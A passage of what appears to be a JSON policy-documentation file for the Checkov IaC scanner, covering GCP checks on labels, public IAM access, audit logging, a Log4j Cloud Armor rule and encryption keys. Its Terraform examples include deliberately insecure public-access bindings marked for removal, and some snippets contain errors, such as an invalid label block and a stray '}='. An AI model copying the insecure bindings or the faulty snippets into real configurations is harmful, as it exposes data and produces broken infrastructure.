        "description": "GCP resources that support labels do not have Labels\nDescription\nMany different types of GCP resources support labels. Labels allow you to add metadata to a resource to help identify ownership, perform cost / billing analysis, and to enrich a resource with other valuable information, such as descriptions and environment names. While there are many ways that labels can be used, we recommend you follow a labeling practice.\nView Google's recommended labeling best practices here.\nsupported_resourcesgoogle_active_directory_domain\ngoogle_bigquery_dataset\ngoogle_bigquery_job\ngoogle_bigquery_table\ngoogle_bigtable_instance\ngoogle_cloud_identity_group\ngoogle_cloudfunctions_function\ngoogle_composer_environment\ngoogle_compute_disk\ngoogle_compute_image\ngoogle_compute_instance\ngoogle_compute_instance_from_template\ngoogle_compute_instance_template\ngoogle_compute_region_disk\ngoogle_compute_snapshot\ngoogle_dataflow_job\ngoogle_dataproc_cluster\ngoogle_dataproc_job\ngoogle_dns_managed_zone\ngoogle_eventarc_trigger\ngoogle_filestore_instance\ngoogle_game_services_game_server_cluster\ngoogle_game_services_game_server_config\ngoogle_game_services_game_server_deployment\ngoogle_game_services_realm\ngoogle_healthcare_consent_store\ngoogle_healthcare_dicom_store\ngoogle_healthcare_fhir_store\ngoogle_healthcare_hl7_v2_store\ngoogle_kms_crypto_key\ngoogle_ml_engine_model\ngoogle_monitoring_notification_channel\ngoogle_network_management_connectivity_test\ngoogle_notebooks_instance\ngoogle_project\ngoogle_pubsub_subscription\ngoogle_pubsub_topic\ngoogle_redis_instance\ngoogle_secret_manager_secret\ngoogle_spanner_instance\ngoogle_storage_bucket\ngoogle_tpu_node\ngoogle_workflows_workflow'\n\nFix - Buildtime \nTerraform\nThe example below shows how to label a security group in Terraform. The syntax is generally the same for any label-enabled resource type.\nGoresource \"google_storage_bucket\" \"auto-expire\" {\n  name          = \"auto-expiring-bucket\"\n  location      = \"US\"\n  force_destroy = true\n\n+  label {\n+    type = prod\n  }\n  \n  lifecycle_rule {\n    condition {\n      age = 3\n    }\n    action {\n      type = \"Delete\"\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_GCP_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-cloud-kms-cryptokeys-are-not-anonymously-or-publicly-accessible",
        "description": "GCP KMS crypto key is anonymously accessible\nDescription\nIt is recommended that the IAM policy on Cloud KMS cryptokeys should restrict anonymous and/or public access.\nGranting permissions to allUsers or allAuthenticatedUsers allows anyone to access the dataset. Such access might not be desirable if sensitive data is stored at the location. In this case, ensure that anonymous and/or public access to a Cloud KMS cryptokey is not allowed.\nFix - Buildtime \nTerraform\n\nResource: google_kms_crypto_key\nArgument: google_kms_crypto_key_iam_member / google_kms_crypto_key_iam_binding\n\nGoresource \"google_kms_key_ring\" \"keyring\" {\n  name = \"keyring-example\"\n  location = \"global\"\n}\n\nresource \"google_kms_crypto_key\" \"bad_key\" {\n  name = \"crypto-key-example\"\n  key_ring = google_kms_key_ring.keyring.id\n  rotation_period = \"100000s\"\n  lifecycle {\n    prevent_destroy = true\n  }\n}\n\nresource \"google_kms_crypto_key_iam_member\" \"bad_member_1\" {\n  crypto_key_id = google_kms_crypto_key.bad_key.id\n  role          = \"roles/cloudkms.cryptoKeyEncrypter\"\n- member        = \"allUsers\"\n}\n\nresource \"google_kms_crypto_key_iam_member\" \"bad_member_2\" {\n  crypto_key_id = google_kms_crypto_key.bad_key.id\n  role          = \"roles/cloudkms.cryptoKeyEncrypter\"\n- member        = \"allAuthenticatedUsers\"\n}\n\nresource \"google_kms_crypto_key_iam_binding\" \"bad_binding_1\" {\n  crypto_key_id = google_kms_crypto_key.bad_key.id\n  role          = \"roles/cloudkms.cryptoKeyEncrypter\"\n- members = [\n-   \"allUsers\",\n- ]\n}\n\nresource \"google_kms_crypto_key_iam_binding\" \"bad_binding_2\" {\n  crypto_key_id = google_kms_crypto_key.bad_key.id\n  role          = \"roles/cloudkms.cryptoKeyEncrypter\"\n- members = [\n-   \"allAuthenticatedUsers\",\n- ]\n}\n\nresource \"google_kms_crypto_key\" \"good_key\" {\n  name = \"crypto-key-example\"\n  key_ring = google_kms_key_ring.keyring.id\n  rotation_period = \"100000s\"\n  lifecycle {\n    prevent_destroy = true\n  }\n}\n\nresource \"google_kms_crypto_key_iam_member\" \"good_member\" {\n  crypto_key_id = google_kms_crypto_key.good_key.id\n  role = \"roles/cloudkms.cryptoKeyEncrypter\"\n+ member = \"user:[email\u00a0protected]\"\n}\n\nresource \"google_kms_crypto_key_iam_binding\" \"good_binding\" {\n  crypto_key_id = google_kms_crypto_key.good_key.id\n  role          = \"roles/cloudkms.cryptoKeyEncrypter\"\n+ members = [\n+   \"user:[email\u00a0protected]\",\n+ ]\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_73": {
        "url": "https://docs.bridgecrew.io/docs/ensure-cloud-armor-prevents-message-lookup-in-log4j2",
        "description": "Front Door WAF allows message lookup in Log4j2\nDescription\nUsing a vulnerable version of Apache Log4j library might enable attackers to exploit a Lookup mechanism that supports making requests using special syntax in a format string which can potentially lead to a risky code execution, data leakage and more.\nSet your Cloud Armor to prevent executing such mechanism using the rule definition below.\nLearn more around CVE-2021-44228\nFix - Buildtime \nTerraform\n\nResource: google_compute_security_policy\n\nGoresource \"google_compute_security_policy\" \"example\" {\n  name = \"example\"\n\n  rule {\n    action   = \"deny(403)\"\n    priority = 1\n    match {\n      expr {\n        expression = \"evaluatePreconfiguredExpr('cve-canary')\"\n      }\n    }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_GCP_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-cloud-audit-logging-is-configured-properly-across-all-services-and-all-users-from-a-project",
        "description": "GCP project audit logging is not configured properly across all services and all users in a project\nDescription\nIt is recommended that Cloud Audit Logging is configured to track all admin activities and read, write access to user data.\nCloud Audit Logging maintains two audit logs for each project, folder, and organization: Admin Activity and Data Access.\n\nAdmin Activity logs contain log entries for API calls or other administrative actions that modify the configuration or metadata of resources. Admin Activity audit logs are enabled for all services and cannot be configured.\nData Access audit logs record API calls that create, modify, or read user-provided data. These are disabled by default and should be enabled.\nThere are three kinds of Data Access audit log information:\n\n\nAdmin read: Records operations that read metadata or configuration information. Admin Activity audit logs record writes of metadata and configuration information that cannot be disabled.\nData read: Records operations that read user-provided data. o Data write: Records operations that write user-provided data.\nIt is recommended to have an effective default audit config configured in such a way that:\n\n\nlogtype is set to DATA_READ (to log user activity tracking) and DATA_WRITES (to log changes/tampering to user data).\naudit config is enabled for all the services supported by the Data Access audit logs feature.\nLogs should be captured for all users, i.e., there are no exempted users in any of the audit config sections. This will ensure overriding the audit config will not contradict the requirement.\n\nFix - Buildtime \nTerraform\n\nResource: google_project\nArgument: google_project_iam_audit_config\n\nGoresource \"google_project\" \"good_project\" {\n  name = \"good\"\n  project_id = \"123456\"\n}\n\nresource \"google_project\" \"bad_project\" {\n  name = \"bad\"\n  project_id = \"123456\"\n}\n\nresource \"google_project_iam_audit_config\" \"project_good_audit\" {\n  project = google_project.good_project.id\n+ service = \"allServices\"\n  audit_log_config {\n    log_type = \"ADMIN_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_WRITE\"\n  }\n}\n\nresource \"google_project_iam_audit_config\" \"project_bad_audit\" {\n  project = google_project.bad_project.id\n- service = \"someService\"\n  audit_log_config {\n    log_type = \"ADMIN_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_READ\"\n-   exempted_members = [\n-     \"user:[email\u00a0protected]\",\n-   ]\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_GCP_10": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-cloud-function-http-trigger-is-secured",
        "description": "GCP Cloud Function HTTP trigger is not secured\nDescription\nThis policy identifies GCP Cloud Functions for which the HTTP trigger is not secured. When you configure HTTP functions to be triggered only with HTTPS, user requests will be redirected to use the HTTPS protocol, which is more secure. It is recommended to set the 'Require HTTPS' for configuring HTTP triggers while deploying your function.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_cloudfunctions_function\" \"pass\" {\n  name        = \"function-test\"\n  description = \"My function\"\n  runtime     = \"nodejs16\"\n\n  available_memory_mb          = 128\n  source_archive_bucket        = google_storage_bucket.bucket.name\n  source_archive_object        = google_storage_bucket_object.archive.name\n  trigger_http                 = true\n  https_trigger_security_level = \"SECURE_ALWAYS\"\n  timeout                      = 60\n  entry_point                  = \"helloGET\"\n  labels = {\n    my-label = \"my-label-value\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_GCP_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-retention-policies-on-log-buckets-are-configured-using-bucket-lock",
        "description": "GCP log bucket retention policy is not configured using bucket lock\nDescription\nEnabling retention policies on log buckets will protect logs stored in cloud storage buckets from being overwritten or accidentally deleted. It is recommended to set up retention policies and configure Bucket Lock on all storage buckets that are used as log sinks.\nLogs can be exported by creating one or more sinks that include a log filter and a destination. As Stackdriver Logging receives new log entries, they are compared against each sink. If a log entry matches a sink's filter, then a copy of the log entry is written to the destination.\nSinks can be configured to export logs in storage buckets. It is recommended to configure a data retention policy for these cloud storage buckets and to lock the data retention policy; thus permanently preventing the policy from being reduced or removed. This way, if the system is ever compromised by an attacker or a malicious insider who wants to cover their tracks, the activity logs are definitely preserved for forensics and security investigations.\nFix - Buildtime \nTerraform\n\nResource: google_logging_folder_sink / google_logging_project_sink / google_logging_organization_sink\nArgument: google_storage_bucket\n\nGoresource \"google_storage_bucket\" \"log_bucket_bad\" {\n  name = \"organization-logging-bucket\"\n\n  retention_policy {\n    retention_period = 604800\n-   is_locked = false\n  }\n}\n\nresource \"google_storage_bucket\" \"log_bucket_good\" {\n  name = \"organization-logging-bucket\"\n\n  retention_policy {\n    retention_period = 604800\n+   is_locked = true\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_100": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-bigquery-table-is-not-publicly-accessible",
        "description": "GCP BigQuery Tables are anonymously or publicly accessible\nDescription\nGCP BigQuery tables are the resources in BigQuery that contain your data records, and each BigQuery table belongs to a dataset. Every BigQuery table inherits the IAM policies attached to it's dataset, but each table can also have it's own IAM policies directly applied. These table-level IAM policies can be set for public access via the allUsers and allAuthenticatedUsers IAM principals which can inadvertently expose your data to the public.\nWe recommend you ensure anonymous and public access to BigQuery tables is not allowed.\nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to BigQuery.\nOn the Dataset Explorer details page, expand the dataset that contains your table.\nSelect your target table's kebab menu and then select open.\nClick the SHARE button to open the table's IAM policies.\nTo remove a specific role assignment, to the front of allUsers and allAuthenticatedUsers, click Delete.\n\nCLI Command\nTo remove access to allUsers and allAuthenticatedUsers, you need to first get the BigQuery tables existing IAM policy. To retrieve the existing policy and copy it to a local file:\nShellbq get-iam-policy --format=prettyjson \\\n PROJECT-ID:DATASET.TABLE \\\n > policy.jso\n\nReplace PROJECT-ID with the project ID where the BigQuery table lives. Replace DATASET with the name of the BigQuery dataset that contains the table. Replace TABLE with the table name.\nNext, locate and remove the IAM bindings with either allUsers or allAuthenticatedUsers depending on your Checkov error. After modifying the policy.json file, update BigQuery table with the following command:\nShellbq set-iam-policy \\\n PROJECT-ID:DATASET.TABLE \\\n policy.json\n\nReplace PROJECT-ID with the project ID where the BigQuery table lives. Replace DATASET with the name of the BigQuery dataset that contains the table. Replace TABLE with the table name.\nFix - Buildtime\nTerraform\n\n\nResource: google_bigquery_table_iam_member\n\n\nField: member\n\n\nResource: google_bigquery_table_iam_binding\n\n\nField: members\n\n\nGo//Option 1\nresource \"google_bigquery_table_iam_member\" \"member\" {\n  dataset_id = google_bigquery_table.default.dataset_id\n  table_id = google_bigquery_table.default.table_id\n  role = \"roles/bigquery.dataOwner\"\n-  member        = \"allUsers\"\n-  member        = \"allAuthenticatedUsers\"\n}\n\n//Option 2\nresource \"google_bigquery_table_iam_binding\" \"binding\" {\n  dataset_id = google_bigquery_table.default.dataset_id\n  table_id = google_bigquery_table.default.table_id\n  role = \"roles/bigquery.dataOwner\"\n  members = [\n-    \"allUsers\",\n-    \"allAuthenticatedUsers\"\n  ]\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_77": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-ftp-port-20-access",
        "description": "GCP Google compute firewall ingress allows FTP port (20) access\nDescription\nIt is a best practice to ensure that your firewall ingress rules do not allow unrestricted access to FTP port 20, as it can increase the risk of unauthorized access or attacks on your network. FTP (File Transfer Protocol) is a widely used protocol for transferring files between computers, but it can also be a potential security risk if not properly configured. By restricting access to only specific IP addresses or ranges that you trust, you can help secure your network from potential threats.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_compute_firewall\" \"restricted\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"20\"]\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n  target_tags   = [\"ftp\"]\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_101": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-artifact-registry-repository-is-not-anonymously-or-publicly-accessible",
        "description": "GCP Artifact Registry repositories are anonymously or publicly accessible\nDescription\nArtifact Registry is a service that stores artifacts and build dependencies for your GCP applications. Artifact registry repositories can contain sensitive credentials that are baked into containers, personal data (like PII), or confidential data that you may not want publicly accessible. Repositories can be made anonymously or publicly accessible via IAM policies containing the IAM members allUsers or allAuthenticatedUsers.\nWe recommend you ensure that neither anonymous or public access to Artifact Registry repositories is allowed.\nFix - Runtime\nGCP Console\nTo remove anonymous or public access for your Artifact Registry repository:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Repositories.\nSelect the target Artifact Registry repository.\nExpand the Info Panel by selecting Show Info Panel.\nTo remove a specific role assignment, select allUsers or allAuthenticatedUsers, and then click Remove member.\n\nCLI Command\nTo remove anonymous or public access for your Artifact Registry repositories use the following command:\nShellgcloud artifacts repositories remove-iam-policy-binding REPOSITORY  \\\n  --member=MEMBER  \\\n  --role=ROLE\n\nReplace REPOSITORY with your repository ID. Replace MEMBER with allUsers or allAuthenticatedUsers depending on your Checkov alert. Replace ROLE with the member's role.\nFix - Buildtime\nTerraform\n\n\nResource: google_artifact_registry_repository_iam_binding\n\n\nField: members\n\n\nResource: google_storage_bucket_iam_member\n\n\nField: member\n\n\nGoresource \"google_artifact_registry_repository_iam_binding\" \"public_binding\" {\n  provider = google-beta\n  location = google_artifact_registry_repository.my-repo.location\n  repository = google_artifact_registry_repository.my-repo.name\n  role = \"roles/artifactregistry.writer\"\n\n  members = [\n-    \"allUsers\",\n-    \"allAuthenticatedUsers\",\n  ]\n}\n\nGoresource \"google_artifact_registry_repository_iam_member\" \"public_member\" {\n  provider = google-beta\n  location = google_artifact_registry_repository.my-repo.location\n  repository = google_artifact_registry_repository.my-repo.name\n  role = \"roles/artifactregistry.writer\"\n\n-  member = \"allUsers\"\n-  member = \"allAuthenticatedUsers\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_78": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-cloud-storage-has-versioning-enabled",
        "description": "GCP Cloud storage does not have versioning enabled\nDescription\nEnabling versioning for your Google Cloud Platform (GCP) Cloud Storage can help improve the security and management of your data. Versioning allows you to keep multiple versions of an object in your storage bucket, and can be useful for a variety of purposes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_storage_bucket\" \"pass\" {\n  name     = \"foo\"\n  location = \"EU\"\n\n  versioning = {\n    enabled = true\n  }=\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_98": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-is-not-anonymously-or-publicly-accessible",
        "description": "GCP Dataproc cluster is anonymously or publicly accessible\nDescription\nDataproc is commonly used for data lake modernization, ETL, and data science workloads. A Dataproc cluster contains at least one \"management\" VM and one \"compute\" VM. Access to Dataproc clusters is controlled via IAM policies. These IAM policies can be set for public access via the allUsers and allAuthenticatedUsers IAM principals which can inadvertently expose your data to the public.\nWe recommend you ensure anonymous and public access to Dataproc clusters is not allowed.\nFix - Runtime\nGCP Console\nTo remove anonymous or public access for Dataproc clusters:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Clusters.\nSelect the target Dataproc cluster.\nExpand the Info Panel by selecting Show Info Panel.\nTo remove a specific role assignment, select allUsers or allAuthenticatedUsers, and then click Remove member.\n\nCLI Command\nTo remove access for allUsers and allAuthenticatedUsers, you need to first get the Dataproc cluster's existing IAM policy. To retrieve the existing policy and copy it to a local file:\nShellgcloud dataproc clusters get-iam-policy CLUSTER-ID  \\\n  --format json > policy.json\n\nReplace CLUSTER-ID with your Dataproc cluster ID.\nNext, locate and remove the IAM bindings with either allUsers or allAuthenticatedUsers depending on your Checkov error. After modifying the policy.json file, update the Dataproc cluster with the following command:\nShellgcloud dataproc clusters set-iam-policy CLUSTER-ID policy.json\n\nReplace CLUSTER-ID with your Dataproc cluster ID.\nFix - Buildtime\nTerraform\n\n\nResource: google_dataproc_cluster_iam_member\n\n\nField: member\n\n\nResource: google_dataproc_cluster_iam_binding\n\n\nField: members\n\n\nGo//Option 1\nresource \"google_dataproc_cluster_iam_member\" \"editor\" {\n  cluster = \"your-dataproc-cluster\"\n  role    = \"roles/editor\"\n-  member        = \"allUsers\"\n-  member        = \"allAuthenticatedUsers\"\n}\n\n//Option 2\nresource \"google_dataproc_cluster_iam_binding\" \"editor\" {\n  cluster = \"your-dataproc-cluster\"\n  role    = \"roles/editor\"\n  members = [\n-    \"allUsers\",\n-    \"allAuthenticatedUsers\"\n  ]\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_92": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-datasets-use-a-customer-manager-key-cmk",
        "description": "GCP Vertex AI datasets do not use a Customer Manager Key (CMK) \nDescription\nThis policy identifies Vertex AI datasets which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Vertex AI datasets data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource: google_vertex_ai_dataset\nArguments:  region.encryption_spec.kms_key_name\n\nGoresource \"google_vertex_ai_dataset\" \"pass\" {\n  display_name        = \"terraform\"\n  metadata_schema_uri = \"gs://google-cloud-aiplatform/schema/dataset/metadata/image_1.0.0.yaml\"\n  region              = \"us-central1\"\n     encryption_spec {\n       kms_key_name=google_kms_crypto_key.example.name\n     }\n\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_84": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-artifact-registry-repositories-are-encrypted-with-customer-supplied-encryption-keys-csek",
        "description": "GCP Artifact Registry repositories are not encrypted with Customer Supplied Encryption Keys (CSEK)\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Artifact Registry repositories. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource: google_artifact_registry_repository\nArguments: kms_key_name\n\nGoresource \"google_artifact_registry_repository\" \"pass\" {\n  provider = google-beta\n\n  location      = \"us-central1\"\n  repository_id = \"my-repository\"\n  description   = \"example docker repository with cmek\"\n  format        = \"DOCKER\"\n  kms_key_name  = google_kms_crypto_key.example.name\n}\n",
        "severity": "LOW"
    },
    "CKV2_GCP_9": {
        "url": "https://docs.bridgecrew.io/docs/ensure-google-container-registry-repository-is-not-anonymously-or-publicly-accessible",
        "description": "GCP Container Registry repositories are anonymously or publicly accessible\nDescription\nGoogle Container Registry (GCR) is a GCP service that contains repositories for your container images. A GCR repo is publicly accessible if the host location's underlying storage bucket is publicly accessible because GCR images are stored in GCS. Public GCR repositories can put your data at risk of exposure and should be adjusted to a more secure configuration (private).\nWe recommend you ensure that neither anonymous or public access to GCR Repositories is allowed.\nFix - Runtime\nGCP Console\nTo remove anonymous or public access to your GCR repositories:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to GCR Settings.\nUnder Public access locate the repositories that say PUBLIC under the Visibility column.\nSelect the dropdown and switch to PRIVATE.\n\nCLI Command\nTo remove anonymous or public access to your GCR repositories use the gsutil command:\nShellgsutil iam ch -d PRINCIPAL gs://BUCKET-NAME\n\nReplace PRINCIPAL with either allUsers or allAuthenticatedUsers depending on your Checkov alert. Replace BUCKET-NAME with the GCS bucket where your images are stored.\nThe BUCKET-NAME can be determined by executing gsutil ls and your Container Registry bucket URL will be listed as gs://artifacts.PROJECT-ID.appspot.com or gs://STORAGE-REGION.artifacts.PROJECT-ID.appspot.com. PROJECT-ID and STORAGE-REGION will be replaced with your GCP project ID or the region where your GCR repository is configured.\nFix - Buildtime\nTerraform\n\n\nResource: google_storage_bucket_iam_binding\n\n\nField: members\n\n\nResource: google_storage_bucket_iam_member\n\n\nField: member\n\n\nGoogle Container Registry (GCR) does not have IAM-specific resources in Terraform. Instead, GCR IAM is handled via GCS IAM resources as seen in the below examples.\nGoresource \"google_storage_bucket_iam_binding\" \"gcr_public_binding\" {\n  bucket = google_storage_bucket.default.name\n  role = \"roles/storage.viewer\"\n\n  members = [\n-    \"allUsers\",\n-    \"allAuthenticatedUsers\",\n  ]\n}\n\nGoresource \"google_artifact_registry_repository_iam_member\" \"public_member\" {\n  provider = google-beta\n  location = google_artifact_registry_repository.my-repo.location\n  repository = google_artifact_registry_repository.my-repo.name\n  role = \"roles/artifactregistry.writer\"\n\n-  member = \"allUsers\"\n-  member = \"allAuthenticatedUsers\"\n}\n\nGoresource \"google_storage_bucket_iam_member\" \"gcr_public_member\" {\n  bucket = google_storage_bucket.default.name\n  role = \"roles/storage.viewer\"\n\n-  member = \"allUsers\"\n-  member = \"allAuthenticatedUsers\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_99": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-pubsub-topic-is-not-anonymously-or-publicly-accessible",
        "description": "Pub/Sub Topic is anonymously or publicly accessible\nDescription\nPub/Sub is commonly used for asynchronous communication for applications in GCP. Messages are published to a Pub/Sub Topic and the ability to publish a message is controlled via IAM policies. It is possible to make Pub/Sub Topics publicly or anonymously accessible. Public notification topics can expose sensitive data and are a target for data exfiltration.\nWe recommend you ensure that neither anonymous or public access to Pub/Sub Topics is allowed.\nFix - Runtime\nGCP Console\nTo remove anonymous or public access to your Pub/Sub Topic:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Topics.\nSelect the Pub/Sub Topic checkbox next to your Topic ID.\nSelect the INFO PANEL tab to view the topic's permissions.\nTo remove a specific role assignment, select allUsers or allAuthenticatedUsers, and then click Delete.\n\nCLI Command\nTo remove access to allUsers and allAuthenticatedUsers, you need to first get the Pub/Sub Topic's existing IAM policy. To retrieve the existing policy and copy it to a local file:\nShellgcloud pubsub topics get-iam-policy \\\n   projects/PROJECT/topics/TOPIC \\\n   --format json > topic_policy.json\n\nReplace PROJECT with the project ID where your Pub/Sub Topic is located. Replace TOPIC with the Pub/Sub Topic ID.\nNext, locate and remove the IAM bindings with either allUsers or allAuthenticatedUsers depending on your Checkov error. After modifying the topic_policy.json file, update Pub/Sub Topic with the following command:\nShellgcloud pubsub topics set-iam-policy  \\\n   projects/PROJECT/topics/TOPIC  \\\n   topic_policy.json\n\nReplace PROJECT with the project ID where your Pub/Sub Topic is located. Replace TOPIC with the Pub/Sub Topic ID.\nFix - Buildtime\nTerraform\n\n\nResource: google_pubsub_topic_iam_binding\n\n\nField: members\n\n\nResource: google_pubsub_topic_iam_member\n\n\nField: member\n\n\nGoresource \"google_pubsub_topic_iam_binding\" \"public_binding\" {\n  topic = google_pubsub_topic.example.name\n  role = \"roles/pubsub.publisher\"\n\n  members = [\n-    \"allUsers\",\n-    \"allAuthenticatedUsers\",\n  ]\n}\n\nGoresource \"google_pubsub_topic_iam_member\" \"public_member\" {\n  topic = google_pubsub_topic.example.name\n  role = \"roles/pubsub.publisher\"\n\n-  member = \"allUsers\"\n-  member = \"allAuthenticatedUsers\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_93": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-spanner-database-is-encrypted-with-customer-supplied-encryption-keys-cseks",
        "description": "GCP Spanner Database is not encrypted with Customer Supplied Encryption Keys (CSEKs)\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Spanner Database. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource: google_spanner_database\nArguments:  encryption_config.kms_key_name\n\nGoresource \"google_spanner_database\" \"pass\" {\n  instance = google_spanner_instance.example.name\n  name     = \"my-database\"\n  ddl = [\n    \"CREATE TABLE t1 (t1 INT64 NOT NULL,) PRIMARY KEY(t1)\",\n    \"CREATE TABLE t2 (t2 INT64 NOT NULL,) PRIMARY KEY(t2)\",\n  ]\n  deletion_protection = false\n     encryption_config {\n       kms_key_name= google_kms_crypto_key.example.name\n     }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_63": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_logging_3",
        "description": "Bucket logs to itself\nDescription\nA check to ensure that the specified logging bucket is not itself. A bucket must not log access to itself, logging requires a second separate bucket.\nFix - Buildtime \nTerraform\n\nResource: google_storage_bucket\nThis check will trigger if you attempt to self reference:\n\ngoogle_storage_bucket.mylovelybucket,tfresource \"google_storage_bucket\" \"mylovelybucket\" {\n  name     = \"mylovelybucket\"\n  location = var.location\n  uniform_bucket_level_access = true\n  logging {\n    log_bucket = \"mylovelybucket\"\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_94": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-cloud-dataflow-job-has-public-ips",
        "description": "GCP Dataflow jobs are not private\nDescription\nCloud Dataflow in GCP is a service used for streaming and batch data processing. A Dataflow job consists of at least one management node and one compute node (both are GCE VMs). By default, these nodes are configured with public IPs that allow them to communicate with the public internet, but this also means they increase your potential attack surface by being publicly accessible.\nWe recommend you remove the public IPs for your Dataflow jobs. View the official Google documentation for the currently supported internet access configuration options.\nFix - Runtime\nGCP Console\nMaking Dataflow jobs private via the console is not currently supported.\nCLI Command\nMaking running Dataflow jobs private via the gcloud CLI is not currently supported. Instead, you need to drain or cancel your job and then re-create with the correct flag configured.\nShell# To cancel a Dataflow job\ngcloud dataflow jobs cancel JOB_ID\n\nReplace JOB_ID with your Dataflow job ID.\nShell# To drain a Dataflow job\ngcloud dataflow jobs drain JOB_ID\n\nReplace JOB_ID with your Dataflow job ID.\nShell# To create a new Dataflow job without public IPs\ngcloud dataflow jobs run JOB_NAME \\\n  --disable-public-ips \\\n  --gcs-location=GCS_LOCATION\n\nReplace JOB_ID with your Dataflow job ID. Replace GCS_LOCATION with the GCS bucket name where your job template lives. Must be a URL beginning with gs://.\nGoogle also provides documentation on how to Turn off external IP address for your Dataflow jobs. This documentation has examples for Java and Python.\nFix - Buildtime\nTerraform\n\nResource: google_dataflow_job\nField: ip_configuration\n\nGoresource \"google_dataflow_job\" \"big_data_job\" {\n  name              = \"dataflow-job\"\n  template_gcs_path = \"gs://my-bucket/templates/template_file\"\n  temp_gcs_location = \"gs://my-bucket/tmp_dir\"\n  parameters = {\n    foo = \"bar\"\n    baz = \"qux\"\n  }\n\n-  ip_configuration = \"WORKER_IP_PUBLIC\"\n+  ip_configuration = \"WORKER_IP_PRIVATE\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_96": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-metadata-store-uses-a-customer-manager-key-cmk",
        "description": "GCP Vertex AI Metadata Store does not use a Customer Manager Key (CMK) \nDescription\nThis policy identifies Vertex AI Metadata Stores which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer-managed KMS Keys to encrypt your Vertex AI Metadata Store data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource: google_vertex_ai_metadata_store\nArguments: region.encryption_spec.kms_key_name\n\nGoresource \"google_vertex_ai_metadata_store\" \"pass\" {\n  name        = \"test-store\"\n  description = \"Store to test the terraform module\"\n  region      = \"us-central1\"\n     encryption_spec {\n         kms_key_name=google_kms_crypto_key.example.name\n     }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_89": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-workbench-does-not-have-public-ips",
